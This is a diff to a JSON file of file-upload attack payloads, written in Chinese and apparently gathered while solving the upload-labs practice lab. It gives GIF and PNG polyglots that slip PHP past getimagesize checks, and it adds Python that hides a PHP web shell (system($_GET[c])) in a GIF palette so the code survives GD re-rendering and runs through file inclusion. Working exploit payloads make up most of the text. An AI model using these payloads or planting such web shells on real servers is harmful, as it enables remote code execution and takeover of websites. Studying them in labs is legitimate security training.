@@ -20,5 +20,17 @@
     "reference_payload": "GIF: 6字节 `GIF89a` + `<?php phpinfo();`（省略 ?> 避免HackMate读取bug）→ 24字节,上传成功。完整版:经典1x1 GIF(35B) `R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAkQBADs=` + `<?php phpinfo();` =51B。PNG: `\\x89PNG\\r\\n\\x1a\\n`(8) + IHDR(len=13,'IHDR',w=1,h=1,08 06 00 00 00) + CRC(1F15C489) + `<?php phpinfo();` =51B,上传成功。",
     "principle": "getimagesize 对 GIF 只查前6字节魔数(GIF89a)、对 PNG 查 signature+完整 IHDR 块、PHP 代码追加在图片合法结构之后仍被 getimagesize 认可;图片马靠文件包含执行。注意 CDP 上传含 `?>` 内容会触发 ERR,省略 PHP 结束标签即可。JPG 需完整含 SOS 的 JPEG,手搓 base64 无法产出有效文件。",
     "source": "upload-labs"
+  },
+  {
+    "id": "auto-20261030173454",
+    "context": "upload-labs Pass-16：上传后服务端用 imagecreatefromgif+imagegif 二次渲染，追加在文件尾部的 PHP 会被 GD 丢弃。关键：256色GIF的全局调色板(GCT)字节会被 GD imagegif 逐字节原样保留。把 PHP 字节铺进调色板RGB值，GD重渲染后PHP存活。",
+    "reference_payload": "Python: php=b'<?php echo P16OK; system($_GET[c]);?>'; pal=bytearray(php)+b'\\x00'*(768-len(php)); im=Image.new('P',(13,1)); im.putpalette(bytes(pal)); [im.putpixel((i,0),i) for i in range(13)]; im.save('carrier.gif','GIF')。上传 carrier.gif → 服务端GD重渲染输出85字节仍含完整PHP → /include.php?file=<newfile>&c=id 执行",
+    "principle": "二次渲染绕过：PHP藏在GD不会重写的字节区（GIF调色板GCT），GD imagegif保留调色板→PHP存活→文件包含触发RCE",
+    "source": "upload-labs",
+    "evidence": {
+      "verify": "echo",
+      "url": "http://localhost:8083/Pass-16/index.php",
+      "match": "P16OK"
+    }
   }
 ]
